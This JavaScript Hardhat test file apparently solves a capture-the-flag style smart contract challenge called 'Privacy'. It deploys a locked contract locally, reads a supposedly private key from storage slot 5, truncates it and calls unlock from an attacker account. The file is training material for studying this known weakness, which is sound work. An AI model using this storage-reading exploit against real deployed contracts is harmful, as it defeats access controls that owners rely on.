const {ethers} = require("hardhat");
const hre = require("hardhat");
const {expect} = require("chai");


describe('[Challenge] Privacy Attack', function () {

    let deployer, attacker;
    let baseContract, attackContract;
    let provider;
    let payment;

    before(async function () {
        /** SETUP SCENARIO */
        [deployer, attacker] = await ethers.getSigners();

        const baseContractFactory = await ethers.getContractFactory('Privacy', deployer);
        baseContract = await baseContractFactory.deploy([
            ethers.utils.formatBytes32String("467a54bc546576854ae5f6c34145792"),
            ethers.utils.formatBytes32String("467a54bc546576854ae5f6c34145792"),
            ethers.utils.formatBytes32String("467a54bc546576854ae5f6c34145792")
        ]);
        provider = hre.ethers.provider;
        // payment = hre.ethers.utils.parseEther('0.0001');

        await baseContract.deployed();

        expect(
            await baseContract.locked()
        ).to.be.equal(true);
    });

    it('Exploit Privacy Attack', async function () {
        // address , paddedSlot
        const storageLocation = await ethers.provider.getStorageAt(baseContract.address,  5);
        const storageValue = ethers.BigNumber.from(storageLocation);
        // console.log(ethers.utils.parseBytes32String( storageValue ));
        // console.log( storageValue.toHexString().substring(0,34) );
        /** CODE YOUR EXPLOIT HERE */
        await baseContract.connect(attacker).unlock( storageValue.toHexString().substring(0,34));
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        expect(
            await baseContract.locked()
        ).to.be.equal(false);

    });
});